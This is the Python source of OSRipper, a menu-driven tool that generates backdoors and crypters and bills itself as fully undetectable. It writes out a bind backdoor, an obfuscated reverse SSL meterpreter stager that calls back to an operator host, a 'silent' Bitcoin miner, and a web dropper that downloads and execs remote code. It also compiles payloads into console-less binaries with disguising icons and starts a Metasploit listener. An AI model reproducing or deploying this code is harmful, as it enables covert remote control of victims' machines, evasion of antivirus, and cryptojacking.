#!/usr/bin/env python3
"""
OSRipper v0.3.1 - Advanced Payload Generator and Crypter
Author: SubGlitch1
License: MIT

A sophisticated, fully undetectable (FUD) backdoor generator and crypter
that specializes in creating advanced payloads for penetration testing
and red team operations.
"""

import os
import sys
import socket
import shutil
import platform
import secrets
import string
import random
import subprocess
import time
from ripgrok import get_tunnels

# Version info
__version__ = "0.3.1"
__author__ = "SubGlitch1"

# Global variables
bind = 0
encrypted = False
reps = False
host = None
port = None
name = "payload"

def clear_screen():
    """Clear the terminal screen."""
    os.system("clear" if os.name == "posix" else "cls")

def display_logo():
    """Display a modern logo."""
    logo = f"""
    ┌─────────────────────────────────────────────────────────────────────────────┐
    │                           🏴‍☠️ OSRipper v{__version__} 🏴‍☠️                           │
    │                                                                             │
    │          ██████╗ ███████╗██████╗ ██╗██████╗ ██████╗ ███████╗██████╗         │
    │         ██╔═══██╗██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗        │
    │         ██║   ██║███████╗██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝        │
    │         ██║   ██║╚════██║██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗        │
    │         ╚██████╔╝███████║██║  ██║██║██║     ██║     ███████╗██║  ██║        │
    │          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝        │
    │                                                                             │
    │                    🚀 Advanced Payload Generator & Crypter                  │
    │                           ⚡ Fully Undetectable (FUD)                       │
    │                                                                             │
    └─────────────────────────────────────────────────────────────────────────────┘
    """
    print(logo)

def display_menu():
    """Display the main menu."""
    menu = f"""
    ┌─────────────────────────────────────────────────────────────────────────────┐
    │                           🏴‍☠️ OSRipper v{__version__} Menu 🏴‍☠️                           │
    ├─────────────────────────────────────────────────────────────────────────────┤
    │                                                                             │
    │  1. 🔗 Create Bind Backdoor                                                 │
    │     └─ Opens a port on victim machine and waits for connection             │
    │                                                                             │
    │  2. 🔐 Create Encrypted TCP Meterpreter (RECOMMENDED)                      │
    │     └─ Reverse connection with SSL/TLS encryption                          │
    │                                                                             │
    │  3. 🎭 Crypt Custom Code                                                    │
    │     └─ Obfuscate and encrypt existing Python scripts                       │
    │                                                                             │
    │  ═══════════════════════════════ Miners ═══════════════════════════════════ │
    │                                                                             │
    │  4. ⛏️  Create Silent BTC Miner                                             │
    │     └─ Stealthy cryptocurrency mining payload                              │
    │                                                                             │
    │  ══════════════════════════ Staged Payloads ══════════════════════════════ │
    │                                                                             │
    │  5. 🌐 Create Encrypted Meterpreter (Staged)                               │
    │     └─ Multi-stage web delivery with enhanced stealth                      │
    │                                                                             │
    └─────────────────────────────────────────────────────────────────────────────┘
    """
    print(menu)

def validate_port(port_str):
    """Validate port number."""
    try:
        port_num = int(port_str)
        return 1024 <= port_num <= 65535
    except ValueError:
        return False

def validate_ip(ip):
    """Validate IP address."""
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def get_user_input(prompt, validator=None, error_msg="Invalid input"):
    """Get validated user input."""
    while True:
        try:
            user_input = input(prompt).strip()
            if not user_input:
                continue
            if validator is None or validator(user_input):
                return user_input
            print(f"❌ {error_msg}")
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
            sys.exit(0)

def generate_random_string(length):
    """Generate random string for obfuscation."""
    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))

def move_file_to_directory(file_path, destination_directory):
    """Move file to destination directory."""
    shutil.move(file_path, destination_directory)

def listen(host, port):
    """Original listen function for bind backdoors."""
    SERVER_HOST = host
    SERVER_PORT = int(port)
    BUFFER_SIZE = 1024 * 128
    SEPARATOR = "<sep>"

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"🎯 Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    while True:
        command = input(f"{cwd} $> ")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
    
    client_socket.close()
    s.close()

def gen_bind():
    """Generate bind backdoor."""
    global port, bind, name
    
    print("\n🔗 Bind Backdoor Generator")
    print("─" * 40)
    
    name = "payload"
    port = get_user_input(
        "Enter port number (1024-65535): ",
        validate_port,
        "Port must be between 1024 and 65535"
    )
    bind = "1"
    
    payload_content = f"""port = {port}

import zlib
import base64
import socket
import struct
import time

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', int(port)))
        s.listen(1)
        client, addr = s.accept()
        
        length = struct.unpack('>I', client.recv(4))[0]
        data = client.recv(length)
        
        while len(data) < length:
            data += client.recv(length - len(data))
        
        exec(zlib.decompress(base64.b64decode(data)), {{'s': client}})
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    main()
"""
    
    with open(name, 'w') as f:
        f.write(payload_content)
    
    print(f"✅ Bind backdoor generated: {name}")
    print(f"📡 Listening on port: {port}")
    print("💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")

def gen_rev_ssl_tcp():
    """Generate reverse SSL TCP meterpreter."""
    global name, host, port
    
    print("\n🔐 Encrypted TCP Meterpreter Generator")
    print("─" * 45)
    
    name = "payload"
    
    use_ngrok = get_user_input(
        "Use ngrok port forwarding? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    if use_ngrok:
        port = get_user_input(
            "Enter local port (1024-65535): ",
            validate_port,
            "Port must be between 1024 and 65535"
        )
        
        print(f"🌐 Starting ngrok tunnel on port {port}")
        print("Please run this command in another terminal:")
        print(f"   ngrok tcp {port}")
        input("Press Enter when ngrok is ready...")
        
        try:
            tunnel_info = get_tunnels()
            host, port = tunnel_info.split(":")
            print(f"✅ Ngrok tunnel established: {host}:{port}")
        except Exception as e:
            print(f"❌ Ngrok setup failed: {e}")
            use_ngrok = False
    
    if not use_ngrok:
        host = get_user_input(
            "Enter callback IP address: ",
            validate_ip,
            "Invalid IP address format"
        )
        port = get_user_input(
            "Enter callback port (1024-65535): ",
            validate_port,
            "Port must be between 1024 and 65535"
        )
    
    # Generate randomized variables
    socket_var = generate_random_string(random.randint(8, 15))
    ssl_var = generate_random_string(random.randint(8, 15))
    length_var = generate_random_string(random.randint(8, 15))
    data_var = generate_random_string(random.randint(8, 15))
    host_var = generate_random_string(random.randint(8, 15))
    port_var = generate_random_string(random.randint(8, 15))
    sleep_time = secrets.randbelow(12)
    
    payload_content = f"""{port_var} = {port}
{host_var} = "{host}"

import zlib
import base64
import socket
import ssl
import struct
import time

# Obfuscated payload loader
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'=ESU5q7A/7DdkvrebXNmTCl0aQAahglRAHgygYSP4mGC0u004WcTeF6+Qszx2bv93KGrVtpLqNylLSpXZbDmD5QwKTguST+/cRw+L92xJrWtPpjqP31zZjuJI2KZiuudWB8cxqU/45/VeUbsqwbJdtBEAtvdddtYXdfOmHFZNSUDIaMALA4XZmnsIXZthvUMG71u9ym3UUFLTPia3LLsIEbLb7GdegSnDo2x6unE2gf1v4Khk8ypBn5zMLjU2tk363fCRnwY2CTypnnakhRIsCm+f8mYPwRiPDNAAA0Q2ldwFwJe'))

for x in range(10):
    try:
        {socket_var} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        {socket_var}.connect(({host_var}, {port_var}))
        {ssl_var} = ssl.wrap_socket({socket_var})
        break
    except:
        time.sleep({sleep_time})

{length_var} = struct.unpack('>I', {ssl_var}.recv(4))[0]
{data_var} = {ssl_var}.recv({length_var})

while len({data_var}) < {length_var}:
    {data_var} += {ssl_var}.recv({length_var} - len({data_var}))

exec(zlib.decompress(base64.b64decode({data_var})), {{'s': {ssl_var}}})
"""
    
    with open(name, 'w') as f:
        f.write(payload_content)
    
    print(f"✅ Reverse TCP meterpreter generated: {name}")
    print(f"📡 Callback: {host}:{port}")

def gen_custom():
    """Generate custom crypter."""
    global name
    
    print("\n🎭 Custom Code Crypter")
    print("─" * 25)
    
    script_path = get_user_input(
        "Enter path to Python script to encrypt: ",
        lambda x: os.path.isfile(x) and x.endswith('.py'),
        "File not found or not a Python script"
    )
    
    name = "payload"
    
    with open(script_path, 'r') as source:
        with open(name, 'w') as target:
            target.write(source.read())
    
    print(f"✅ Custom script processed: {name}")

def gen_btc_miner():
    """Generate Bitcoin miner."""
    global name
    
    print("\n⛏️  Silent BTC Miner Generator")
    print("─" * 35)
    
    name = "payload"
    btc_address = get_user_input(
        "Enter Bitcoin payout address: ",
        lambda x: len(x) >= 26 and len(x) <= 35,
        "Invalid Bitcoin address format"
    )
    
    miner_code = f'''
import socket
import json
import hashlib
import binascii
import time
import random

def main():
    address = "{btc_address}"
    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
    
    host = 'solo.ckpool.org'
    port = 3333
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Server connection
        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
        lines = sock.recv(1024).decode().split('\n')
        response = json.loads(lines[0])
        sub_details, extranonce1, extranonce2_size = response['result']
        
        # Authorize worker
        auth_msg = f'{{"params": ["{btc_address}", "password"], "id": 2, "method": "mining.authorize"}}\n'
        sock.sendall(auth_msg.encode())
        
        # Mining loop
        response = b''
        while response.count(b'\n') < 4 and not(b'mining.notify' in response):
            response += sock.recv(1024)
        
        responses = [json.loads(res) for res in response.decode().split('\n') 
                    if len(res.strip()) > 0 and 'mining.notify' in res]
        
        if responses:
            job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean_jobs = responses[0]['params']
            
            # Calculate target and mine
            target = (nbits[2:] + '00' * (int(nbits[:2], 16) - 3)).zfill(64)
            extranonce2 = '00' * extranonce2_size
            
            coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
            coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
            
            merkle_root = coinbase_hash_bin
            for h in merkle_branch:
                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
            
            merkle_root = binascii.hexlify(merkle_root).decode()
            merkle_root = ''.join([merkle_root[i:i+2] for i in range(0, len(merkle_root), 2)][::-1])
            
            blockheader = version + prevhash + merkle_root + nbits + ntime + nonce + \
                '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
            
            hash_result = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
            hash_hex = binascii.hexlify(hash_result).decode()
            
            if hash_hex < target:
                payload = f'{{"params": ["{btc_address}", "{job_id}", "{extranonce2}", "{ntime}", "{nonce}"], "id": 1, "method": "mining.submit"}}\n'
                sock.sendall(payload.encode())
        
        sock.close()
        
    except Exception:
        time.sleep(10)
        main()

if __name__ == "__main__":
    while True:
        main()
'''
    
    with open(name, 'w') as f:
        f.write(miner_code)
    
    print(f"✅ BTC miner generated: {name}")
    print(f"💰 Payout address: {btc_address}")
    print("📊 Monitor at: https://solo.ckpool.org/")

def postgen():
    """Handle post-generation options."""
    global encrypted
    
    print("\n🔧 Post-Generation Options")
    print("─" * 30)
    
    # Obfuscation
    obfuscate = get_user_input(
        "Obfuscate payload? (recommended) (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    if obfuscate:
        try:
            import obfuscator
            encrypted = True
            obfuscator.MainMenu(name)
            print("✅ Payload obfuscated successfully")
        except Exception as e:
            print(f"❌ Obfuscation failed: {e}")
    
    # Compilation
    compile_binary = get_user_input(
        "Compile to binary? (y/n): ",
        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
        "Please enter 'y' or 'n'"
    ).lower() in ['y', 'yes']
    
    if compile_binary:
        compile_payload()

def compile_payload():
    """Compile payload to binary."""
    try:
        os.makedirs("dist", exist_ok=True)
        
        icon_path = input("Enter .ico path for custom icon (or press Enter for default): ").strip()
        source_file = f"{name}_or.py" if encrypted else f"{name}.py"
        
        cmd_parts = [
            "python3", "-m", "nuitka",
            "--standalone",
            "--include-module=sandboxed",
            "--disable-console",
            "--windows-disable-console",
            "--onefile",
            "--assume-yes-for-downloads"
        ]
        
        if platform.system() == "Darwin":
            cmd_parts.append("--macos-create-app-bundle")
            if icon_path and os.path.exists(icon_path):
                cmd_parts.append(f"--macos-onefile-icon={icon_path}")
        
        if icon_path and os.path.exists(icon_path) and platform.system() != "Darwin":
            cmd_parts.append(f"--windows-icon-from-ico={icon_path}")
        
        cmd_parts.append(source_file)
        
        print("🔨 Compiling payload...")
        result = subprocess.run(cmd_parts, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("✅ Compilation successful!")
            print("📁 Binary saved in: dist/")
        else:
            print("❌ Compilation failed")
            print(f"Error: {result.stderr}")
            
    except Exception as e:
        print(f"❌ Compilation error: {e}")

def start_web_server(webroot):
    """Start web server for staged payloads."""
    try:
        cmd = ["python3", "-m", "http.server", "8000", "--directory", webroot]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("🌐 Web server started in background on port 8000")
    except Exception as e:
        print(f"❌ Failed to start web server: {e}")

def webdelivery():
    """Create web delivery dropper."""
    with open("dropper.py", "w") as f:
        dropper_code = f'''
import requests
import time
import random

def download_and_execute():
    try:
        url = "http://{host}:8000/{name}_or.py"
        time.sleep(random.randint(1, 10))
        
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            exec(response.text)
        else:
            time.sleep(300)
            download_and_execute()
    except Exception:
        time.sleep(300)
        download_and_execute()

if __name__ == "__main__":
    download_and_execute()
'''
        f.write(dropper_code)
    
    # Obfuscate dropper
    try:
        import obfuscator
        obfuscator.MainMenu("dropper.py")
    except Exception:
        pass
    
    # Compile dropper
    try:
        subprocess.run([
            "python3", "-m", "nuitka", "--standalone", "--include-module=sandboxed",
            "--disable-console", "--onefile", "--assume-yes-for-downloads", "dropper_or.py"
        ], check=True)
    except Exception:
        pass

def cleanup():
    """Clean up temporary files."""
    try:
        temp_files = [f"{name}.py", f"{name}_or.py", f"{name}_or.spec", "dropper.py", "dropper_or.py", "tmp.txt"]
        for file in temp_files:
            if os.path.exists(file):
                os.remove(file)
    except Exception:
        pass

def start_listener():
    """Start Metasploit listener."""
    if not bind and host and port:
        try:
            print("🎯 Starting Metasploit listener...")
            cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'"
            os.system(cmd)
        except Exception as e:
            print(f"❌ Failed to start listener: {e}")
            print(f"💡 Manually run: msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'")

def main():
    """Main application."""
    try:
        clear_screen()
        display_logo()
        display_menu()
        
        choice = get_user_input(
            "\n🎯 Select module (1-5): ",
            lambda x: x in ['1', '2', '3', '4', '5'],
            "Please select a valid option (1-5)"
        )
        
        print(f"\n🚀 Executing module {choice}...")
        
        if choice == '1':
            gen_bind()
            postgen()
            cleanup()
            print("\n💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
            
        elif choice == '2':
            gen_rev_ssl_tcp()
            postgen()
            start_listener()
            
        elif choice == '3':
            gen_custom()
            postgen()
            
        elif choice == '4':
            gen_btc_miner()
            postgen()
            
        elif choice == '5':
            gen_rev_ssl_tcp()
            postgen()
            
            # Move to webroot and start server
            os.makedirs("webroot", exist_ok=True)
            payload_file = f"{name}_or.py" if encrypted else f"{name}.py"
            if os.path.exists(payload_file):
                shutil.move(payload_file, f"webroot/{payload_file}")
            
            webdelivery()
            start_web_server("webroot")
            start_listener()
        
        print("\n✅ Operation completed successfully!")
        print("📁 Check the 'dist' directory for your files")
        
    except KeyboardInterrupt:
        print("\n\n👋 Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
    finally:
        print("\n🏴‍☠️ Thanks for using OSRipper!")

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 6):
        print("❌ Python 3.6 or higher is required")
        sys.exit(1)
    
    main()
